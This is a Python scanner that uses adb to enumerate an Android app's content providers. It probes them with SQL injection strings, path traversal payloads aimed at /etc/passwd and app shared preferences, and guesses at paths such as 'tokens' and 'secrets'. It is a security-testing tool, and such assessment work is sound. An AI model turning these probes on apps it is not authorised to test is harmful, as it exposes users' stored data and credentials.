#!/usr/bin/env python3
"""
Content Provider Scanner for Android Applications

Enumerates and tests content providers for common vulnerabilities:
- SQL injection
- Path traversal
- Insecure permissions
- Data exposure

Usage: python3 content_provider_scanner.py <package_name>
"""

import subprocess
import sys
import re
import argparse
from typing import Optional


def run_adb(args: list[str], timeout: int = 30) -> tuple[str, str, int]:
    """Execute an ADB command and return stdout, stderr, returncode."""
    cmd = ["adb", "shell"] + args
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return result.stdout.strip(), result.stderr.strip(), result.returncode


def get_content_providers(package_name: str) -> list[dict]:
    """Extract content provider information from package."""
    providers = []

    stdout, _, _ = run_adb(["dumpsys", "package", package_name])

    # Find provider section
    in_provider_section = False
    current_provider = {}

    for line in stdout.split("\n"):
        line = line.strip()

        if "ContentProvider" in line or "Provider" in line:
            in_provider_section = True

        if in_provider_section:
            if "authority=" in line.lower():
                match = re.search(r'authority[=:]([^\s]+)', line, re.IGNORECASE)
                if match:
                    auth = match.group(1).strip('"').strip("'")
                    current_provider["authority"] = auth

            if "exported=" in line.lower():
                current_provider["exported"] = "true" in line.lower()

            if "readPermission=" in line.lower():
                match = re.search(r'readPermission=([^\s]+)', line)
                if match:
                    current_provider["read_permission"] = match.group(1)

            if "writePermission=" in line.lower():
                match = re.search(r'writePermission=([^\s]+)', line)
                if match:
                    current_provider["write_permission"] = match.group(1)

            # Provider entry complete
            if current_provider.get("authority"):
                providers.append(current_provider.copy())
                current_provider = {}

    return providers


def test_query(authority: str, path: str = "") -> tuple[bool, str]:
    """Test if content provider is queryable."""
    uri = f"content://{authority}/{path}" if path else f"content://{authority}"

    stdout, stderr, rc = run_adb(["content", "query", "--uri", uri])

    if rc == 0 and stdout and "No result" not in stdout:
        return True, stdout[:500]  # Truncate for readability
    return False, stderr


def test_sql_injection(authority: str) -> list[dict]:
    """Test content provider for SQL injection."""
    findings = []

    payloads = [
        ("Basic OR", "1=1--"),
        ("UNION SELECT", "1=1 UNION SELECT 1--"),
        ("String termination", "' OR '1'='1"),
        ("Comment injection", "1; --"),
        ("Stacked queries", "1; SELECT * FROM sqlite_master--"),
    ]

    for name, payload in payloads:
        uri = f"content://{authority}"

        stdout, stderr, rc = run_adb([
            "content", "query", "--uri", uri, "--where", payload
        ])

        # Check for successful injection indicators
        if rc == 0 and stdout and "Error" not in stderr:
            findings.append({
                "type": "SQL Injection",
                "payload": payload,
                "test": name,
                "response": stdout[:200]
            })

    return findings


def test_path_traversal(authority: str) -> list[dict]:
    """Test content provider for path traversal."""
    findings = []

    payloads = [
        ("Basic traversal", "../../../etc/passwd"),
        ("Double encoding", "..%252f..%252f..%252fetc/passwd"),
        ("Null byte", "../../../etc/passwd%00"),
        ("App data", "../../../data/data"),
        ("Shared prefs", "../../shared_prefs/"),
    ]

    for name, payload in payloads:
        # Test with content read
        stdout, stderr, rc = run_adb([
            "content", "read", "--uri", f"content://{authority}/{payload}"
        ])

        if rc == 0 and stdout and "Error" not in stderr and "Exception" not in stderr:
            findings.append({
                "type": "Path Traversal",
                "payload": payload,
                "test": name,
                "response": stdout[:200]
            })

    return findings


def enumerate_common_paths(authority: str) -> list[str]:
    """Try common content provider paths."""
    accessible_paths = []

    common_paths = [
        "",
        "users",
        "user",
        "accounts",
        "account",
        "data",
        "files",
        "images",
        "photos",
        "messages",
        "contacts",
        "settings",
        "config",
        "tokens",
        "sessions",
        "logs",
        "cache",
        "credentials",
        "keys",
        "secrets",
    ]

    for path in common_paths:
        success, data = test_query(authority, path)
        if success:
            accessible_paths.append(path if path else "(root)")

    return accessible_paths


def scan_provider(authority: str, verbose: bool = False) -> dict:
    """Perform comprehensive scan of a content provider."""
    results = {
        "authority": authority,
        "accessible": False,
        "paths": [],
        "sql_injection": [],
        "path_traversal": [],
        "data_sample": None
    }

    print(f"\n[*] Scanning: content://{authority}")

    # Test basic accessibility
    success, data = test_query(authority)
    results["accessible"] = success
    if success:
        print(f"  [+] Provider is accessible!")
        results["data_sample"] = data[:500]
        if verbose:
            print(f"  [DATA] {data[:200]}...")
    else:
        print(f"  [-] Provider not directly accessible")

    # Enumerate paths
    print(f"  [*] Enumerating paths...")
    results["paths"] = enumerate_common_paths(authority)
    if results["paths"]:
        print(f"  [+] Found {len(results['paths'])} accessible paths: {', '.join(results['paths'][:5])}")

    # SQL injection tests
    print(f"  [*] Testing SQL injection...")
    results["sql_injection"] = test_sql_injection(authority)
    if results["sql_injection"]:
        print(f"  [!] Found {len(results['sql_injection'])} potential SQL injection points!")
        for finding in results["sql_injection"]:
            print(f"      - {finding['test']}: {finding['payload']}")

    # Path traversal tests
    print(f"  [*] Testing path traversal...")
    results["path_traversal"] = test_path_traversal(authority)
    if results["path_traversal"]:
        print(f"  [!] Found {len(results['path_traversal'])} potential path traversal vulnerabilities!")
        for finding in results["path_traversal"]:
            print(f"      - {finding['test']}: {finding['payload']}")

    return results


def main():
    parser = argparse.ArgumentParser(
        description="Scan Android content providers for vulnerabilities"
    )
    parser.add_argument("package", help="Target package name")
    parser.add_argument("-a", "--authority", help="Specific authority to test")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--exported-only", action="store_true",
                        help="Only scan exported providers")

    args = parser.parse_args()

    print(f"[*] Content Provider Scanner")
    print(f"[*] Target: {args.package}")
    print("=" * 50)

    if args.authority:
        # Scan specific authority
        results = [scan_provider(args.authority, args.verbose)]
    else:
        # Discover and scan all providers
        print("[*] Discovering content providers...")
        providers = get_content_providers(args.package)

        if not providers:
            print("[-] No content providers found")
            sys.exit(1)

        print(f"[+] Found {len(providers)} content provider(s)")

        results = []
        for provider in providers:
            authority = provider.get("authority")
            if not authority:
                continue

            if args.exported_only and not provider.get("exported", False):
                continue

            result = scan_provider(authority, args.verbose)
            result["provider_info"] = provider
            results.append(result)

    # Summary
    print("\n" + "=" * 50)
    print("[*] SCAN SUMMARY")
    print("=" * 50)

    vulnerable_count = 0
    for result in results:
        if result["sql_injection"] or result["path_traversal"] or result["accessible"]:
            vulnerable_count += 1
            print(f"\n[!] {result['authority']}:")
            if result["accessible"]:
                print(f"    - Data accessible ({len(result['paths'])} paths)")
            if result["sql_injection"]:
                print(f"    - SQL Injection: {len(result['sql_injection'])} findings")
            if result["path_traversal"]:
                print(f"    - Path Traversal: {len(result['path_traversal'])} findings")

    if vulnerable_count == 0:
        print("\n[+] No obvious vulnerabilities found")
    else:
        print(f"\n[!] {vulnerable_count} provider(s) with potential issues")


if __name__ == "__main__":
    main()
